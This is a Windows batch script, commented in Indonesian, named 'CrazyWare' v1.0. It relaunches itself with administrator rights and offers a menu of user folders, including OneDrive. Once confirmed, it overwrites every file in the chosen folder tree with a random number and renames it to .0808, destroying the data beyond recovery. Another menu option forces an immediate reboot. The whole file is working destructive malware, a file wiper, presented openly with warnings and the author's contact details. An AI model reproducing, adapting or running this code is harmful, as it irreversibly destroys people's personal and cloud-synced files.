@echo off
setlocal enabledelayedexpansion
:: Cek apakah dipanggil untuk Refresh TANPA Loading
if "%1"=="nl" goto menu

:: ======================================
:: Jalur normal & Refresh BIASA (ada loading)
:: ======================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)
for /f %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"

:cek_wifi_ulang
cls
:: Cek apakah WiFi tersambung
set "SSID="
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces 2^>nul ^| findstr /i /r "SSID.*:"') do (
    set "temp=%%a"
    set "SSID=!temp: =!"
)

:: Jika tidak ada SSID = tidak tersambung / mati
if not defined SSID (
    echo !ESC![91mDisconnect!ESC![0m
    echo.
    echo !ESC![93mReconnecting!ESC![0m
    timeout /t 3 >nul
    cls
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
    
)

echo Creator           : !ESC![96manotherone!ESC![0m
echo Youtube Channel   : !ESC![96mhttps://www.youtube.com/@anotherone-h9e!ESC![0m
echo Phone Number      : !ESC![96m+62 814-6977-8172!ESC![0m
echo.

:: Warna Kuning
echo !ESC![93mWarning this not a joke!ESC![0m

:: Warna Biru
echo !ESC![94mYou can just type N for canceling but type Y for Continue And Type see channel for seeing in youtube and type call number for call the dev in WhatsApp!ESC![0m
echo.

:: Tunggu input dari pengguna
set "pilihan="
set /p pilihan=Choose... (Y/N): 

set "aksi="

if /i "%pilihan%"=="call number" (
    echo starting WhatsApp web...
    timeout /t 3 >nul
    set "WA_NUMBER=6281469778172"
    start msedge.exe "https://wa.me/!WA_NUMBER!"
    set "aksi=wa"
    exit
)

if /i "%pilihan%"=="see channel" (
    echo Starting Microsoft Edge...
    timeout /t 2 >nul
    start msedge.exe "https://www.youtube.com/@anotherone-h9e"
    set "aksi=channel"
    goto menu
)

if /i "%pilihan%"=="Y" (
    set "aksi=lanjut"
    goto warning
)

if /i "%pilihan%"=="N" (
    set "aksi=keluar"
    goto exit
)

if not defined aksi (
    cls
    echo !ESC![91mSyntax Error: "%pilihan%" is not defined!ESC![0m
    timeout /t 3 >nul
    start msedge.exe "https://web.archive.org/web/20041127054725/http://www.youareanidiot.org/"
    timeout /t 2 >nul
    goto menu
)

:warning
cls
echo !ESC![91mIf you run this, take your own risk!ESC![0m
echo.
set /p warning=Continue? (Y/N): 

if /i "%warning%"=="Y" (
    goto loading2
)
if /i "%warning%"=="N" (
    goto exit
)

:loading2
cls
title CrazyWare
echo Welcome To Crazyware!
timeout /t 3 >nul
goto loading

:loading
cls
for /l %%i in (1,1,3) do (
    cls
    echo Loading.
    timeout /t 1 >nul
    cls
    echo Loading..
    timeout /t 1 >nul
    cls
    echo Loading...
    timeout /t 1 >nul
)
cls
echo !ESC![92mLoading complete!ESC![0m
timeout /t 2 >nul
goto menu

:: ======================================
:: PERIKSA & DETEKSI LOKASI ONEDRIVE
:: ======================================
:detect_onedrive
set "OneDrivePath="
for /f "tokens=2*" %%a in ('reg query "HKCU\Software\Microsoft\OneDrive" /v "UserFolder" 2^>nul') do set "OneDrivePath=%%b"
if not defined OneDrivePath if exist "%USERPROFILE%\OneDrive" set "OneDrivePath=%USERPROFILE%\OneDrive"
if not defined OneDrivePath (
    for /d %%d in ("%USERPROFILE%\OneDrive – *") do set "OneDrivePath=%%d"
)
goto :eof

:: ======================================
:: Perintah Refresh
:: ======================================
:refresh
cls
echo !ESC![93mRefreshing, please wait...!ESC![0m
timeout /t 1 >nul
powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
exit /b

:refreshnl
powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList 'nl' -Verb RunAs"
exit /b

:: ======================================
:: Menu Utama
:: ======================================
:menu
cls
echo !ESC![97m==================== CRAZYWARE MENU ====================!ESC![0m
color 0A
echo           .                                                      .
echo         .n                   .                 .                  n.
echo   .   .dP                  dP                   9b                 9b.    .
echo  4    qXb         .       dX                     Xb       .        dXp     t
echo dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
echo 9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
echo 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
echo   ^`9XXXXXXXXXXXXXXXXXXXXX'~   ~^`OOO8b   d8OOO'~   ~^`XXXXXXXXXXXXXXXXXXXXXP'
echo     ^`9XXXXXXXXXXXP' ^`9XX'   !ESC![91mDIE !ESC![92m    ^`98v8P' !ESC![91m HUMAN !ESC![92m  ^`XXP' ^`9XXXXXXXXXXXP'
echo         ~~~~~~~       9X.          .db^|db.          .XP       ~~~~~~~
echo                         )b.  .dbo.dP'^`v'^`9b.odb.  .dX(
echo                       ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
echo                      dXXXXXXXXXXXP'   .   ^`9XXXXXXXXXXXb
echo                     dXXXXXXXXXXXXb   d^|b   dXXXXXXXXXXXXb
echo                     9XXb'   ^`XXXXXb.dX^|Xb.dXXXXX'   ^`dXXP
echo                      ^`'      9XXXXXX(   )XXXXXXP      ^`'
echo                               XXXX X.^`v'.X XXXX
echo                               XP^X'^`b   d'^`X^XX
echo                               X. 9  ^`   '  P )X
echo                               ^`b  ^`       '  d'
echo                                ^`             '
echo                                   !ESC![93m  v.1.0 !ESC![0m

call :detect_onedrive
echo.
echo !ESC![92m- Pictures!ESC![0m
echo !ESC![92m- Documents!ESC![0m
echo !ESC![92m- Desktop!ESC![0m
echo !ESC![92m- Downloads!ESC![0m
echo !ESC![92m- Music!ESC![0m
echo !ESC![92m- Videos!ESC![0m
if defined OneDrivePath (
    echo !ESC![92m- OneDrive [!ESC![92mDETECTED!ESC![0m]!ESC![0m
) else (
    echo !ESC![92m- OneDrive [!ESC![91mNOT DETECTED!ESC![0m]!ESC![0m
)
echo.
echo !ESC![96mOther commands: exit, help, refresh, refreshnl, See the script, Edit script!ESC![0m
echo.

set "fold=" & set "exam="
set /p pil=!ESC![95mPlease select the folder or command: !ESC![0m

if not defined pil goto menu

:: Cek perintah khusus
if /i "%pil%"=="fuck" (
    cls
    echo You chose: %pil%
    echo Running command...
    timeout /t 2 >nul
    cls
    goto wdy
)
if /i "%pil%"=="See the script" (
    cls
    echo You chose: %pil%
    echo Running command...
    timeout /t 2 >nul
    cls
    goto showscript
)
if /i "%pil%"=="Edit script" (
    cls
    echo You chose: %pil%
    echo Running command...
    timeout /t 2 >nul
    cls
    goto edit_in_cmd
)
if /i "%pil%"=="OneDrive" (
    cls
    echo You chose: %pil%
    echo Running command...
    timeout /t 2 >nul
    cls
    goto set_onedrive
)
if /i "%pil%"=="exit" (
    cls
    echo You chose: %pil%
    echo Closing program...
    timeout /t 2 >nul
    cls
    goto exit
)
if /i "%pil%"=="Refresh" (
    cls
    echo You chose: %pil%
    echo Refreshing...
    timeout /t 2 >nul
    cls
    goto refresh 
)
if /i "%pil%"=="Refreshnl" (
    cls
    echo You chose: %pil%
    echo Refreshing without loading...
    timeout /t 2 >nul
    cls
    goto refreshnl
)
if /i "%pil%"=="Help" (
    cls
    echo You chose: %pil%
    echo Opening help menu...
    timeout /t 2 >nul
    cls
    goto help
)

:: Tentukan lokasi folder
if defined OneDrivePath (
    if /i "%pil%"=="Pictures"   set "fold=!OneDrivePath!\Pictures" & set "exam=Pictures" & goto sure
    if /i "%pil%"=="Documents"  set "fold=!OneDrivePath!\Documents" & set "exam=Documents" & goto sure
    if /i "%pil%"=="Desktop"    set "fold=!OneDrivePath!\Desktop" & set "exam=Desktop" & goto sure
) else (
    if /i "%pil%"=="Pictures"   set "fold=%USERPROFILE%\Pictures" & set "exam=Pictures" & goto sure
    if /i "%pil%"=="Documents"  set "fold=%USERPROFILE%\Documents" & set "exam=Documents" & goto sure
    if /i "%pil%"=="Desktop"    set "fold=%USERPROFILE%\Desktop" & set "exam=Desktop" & goto sure
)
if /i "%pil%"=="Downloads"  set "fold=%USERPROFILE%\Downloads" & set "exam=Downloads" & goto sure
if /i "%pil%"=="Music"      set "fold=%USERPROFILE%\Music" & set "exam=Music" & goto sure
if /i "%pil%"=="Videos"     set "fold=%USERPROFILE%\Videos" & set "exam=Videos" & goto sure

:: Jika ketik sembarangan
if not defined fold (
    cls
    echo !ESC![91mSyntax Error: "%pil%" is not defined!ESC![0m
    timeout /t 3 >nul
    goto menu
    cls
)

:: ======================================
:: ✅ EDIT LANGSUNG DI DALAM CMD
:: ======================================
:edit_in_cmd
cls
echo !ESC![97m==================================================!ESC![0m
echo !ESC![96m               EDIT SCRIPT INSIDE CMD!ESC![0m
echo !ESC![97m==================================================!ESC![0m
echo.
echo --- Kode skrip saat ini ---
echo.
type "%~f0"
echo.
echo !ESC![97m==================================================!ESC![0m
echo.
echo !ESC![93mCara pakai:!ESC![0m
echo - Ketik ulang atau ubah baris sesuai keinginan
echo - Kalau sudah selesai, ketik: !ESC![92mSAVE!ESC![0m
echo - Untuk keluar tanpa menyimpan, ketik: !ESC![91mCANCEL!ESC![0m
echo.
echo Mulai ketik kode baru di bawah ini:
echo !ESC![97m--------------------------------------------------!ESC![0m

:: Hapus file sementara dulu
del "%~dp0temp_edit.bat" 2>nul

:edit_loop
set "line="
set /p "line=> "
if /i "%line%"=="SAVE" goto save_edit
if /i "%line%"=="CANCEL" goto cancel_edit
echo %line% >> "%~dp0temp_edit.bat"
goto edit_loop

:save_edit
cls
echo !ESC![92mMenyimpan perubahan...!ESC![0m
move /y "%~dp0temp_edit.bat" "%~f0" >nul
echo !ESC![92mBerhasil disimpan! Silakan jalankan ulang untuk melihat perubahan!ESC![0m
timeout /t 3 >nul
goto menu

:cancel_edit
del "%~dp0temp_edit.bat" 2>nul
cls
echo !ESC![93mDibatalkan, tidak ada perubahan yang disimpan!ESC![0m
timeout /t 2 >nul
goto menu

:: ======================================
:: Tampilkan Script Saja
:: ======================================
:showscript
cls
echo !ESC![97m==================================================!ESC![0m
echo !ESC![96m                  FULL SCRIPT CODE!ESC![0m
echo !ESC![97m==================================================!ESC![0m
echo.
type "%~f0"
echo.
echo !ESC![97m==================================================!ESC![0m
echo.
set /p backcmd=Type "back" to return to main menu: 
if /i "%backcmd%"=="back" goto menu
goto showscript

:: ======================================
:: Set Jalur OneDrive
:: ======================================
:set_onedrive
if defined OneDrivePath (
    set "fold=!OneDrivePath!"
    set "exam=OneDrive"
    goto sure
) else (
    cls
    echo !ESC![91mOneDrive is not installed or detected!ESC![0m
    timeout /t 3 >nul
    goto menu
)

:: ======================================
:: Fitur Khusus "fuck"
:: ======================================
:wdy
cls
echo Valid Response: !ESC![92mNothing!ESC![0m / !ESC![91mFuck!ESC![0m
set "wdy="
set /p wdy=What do you mean? 
if /i "%wdy%"=="nothing" (
    cls
    echo !ESC![92mOK :)!ESC![0m
    timeout /t 2 >nul
    goto menu
)
if /i "%wdy%"=="fuck" (
    cls
    echo !ESC![91mGRRRRR!!!!ESC![0m
    timeout /t 3 >nul
    shutdown /r /t 0
)
if not defined wdy (
    cls
    echo !ESC![91mInput cannot be empty!ESC![0m
    timeout /t 3 >nul
    goto wdy
)
cls
echo !ESC![93mInvalid input! Try again...!ESC![0m
timeout /t 2 >nul
goto wdy

:: ======================================
:: Konfirmasi & Proses
:: ======================================
:sure
cls
echo !ESC![91mWARNING: You have selected folder "%exam%"!ESC![0m
echo !ESC![91mAll files including subfolders will be overwritten and renamed!ESC![0m
echo.
if /i "%exam%"=="OneDrive" (
    cls
    echo !ESC![91m!!! EXTRA WARNING: This is a cloud sync folder !!!!ESC![0m
    echo !ESC![91mChanges will sync to online storage if connected!ESC![0m
    echo.
)
set /p sure=Are You Sure? (y/n): 
if /i "%sure%"=="y"   goto asli
if /i "%sure%"=="n"   goto batal
goto sure

:batal
cls
echo !ESC![93mProcess cancelled!ESC![0m
echo.
set /p back=Back To Menu Or Exit? (back/exit): 
if /i "%back%"=="exit"   goto exit
if /i "%back%"=="back"   goto menu
goto batal

:asli
set "ada_file="
for /r "%fold%" %%F in (*.*) do set "ada_file=1"
if not defined ada_file (
    cls
    echo !ESC![91m%exam% folder and all its subfolders have no files!ESC![0m
    timeout /t 4 >nul
    goto menu
)
cls
echo !ESC![93mProcessing files in %exam%...!ESC![0m
for /r "%fold%" %%F in (*.*) do (
    set /a randnum=!random! %% 9000 + 1000
    > "%%F" echo !randnum!
    ren "%%F" "%%~nF.0808" 2>nul
)
cls
echo !ESC![97m======================================!ESC![0m
echo !ESC![93mNOTICE:!ESC![0m
echo !ESC![93mAll files in %exam% have been overwritten and renamed to .0808!ESC![0m
echo !ESC![91mYou CANNOT restore them unless you have a backup!ESC![0m
echo !ESC![97m======================================!ESC![0m
echo.
set /p h=Back To Menu Or Exit Or see the channel? (back/exit/see chanel): 
if /i "%h%"=="exit"   goto exit
if /i "%h%"=="see channel"   echo Starting Microsoft edge... &timeout /t 2 >nul & start msedge.exe "https://www.youtube.com/@anotherone-h9e" & exit
if /i "%h%"=="back"   goto menu
goto menu

:: ======================================
:: Bantuan & Keluar
:: ======================================
:help
cls
echo !ESC![97m================== HELP ==================!ESC![0m
echo Available commands:
echo - Pictures, Documents, Desktop, Downloads, Music, Videos
echo - OneDrive        = Select OneDrive folder
echo - EXIT            = Close program
echo - REFRESH         = Restart with loading
echo - REFRESHNL       = Restart without loading
echo - SEE THE SCRIPT  = View code only
echo - EDIT SCRIPT     = Edit directly inside CMD
echo !ESC![97m==========================================!ESC![0m
timeout /t 12 >nul
cls
goto menu

:exit
endlocal
exit /b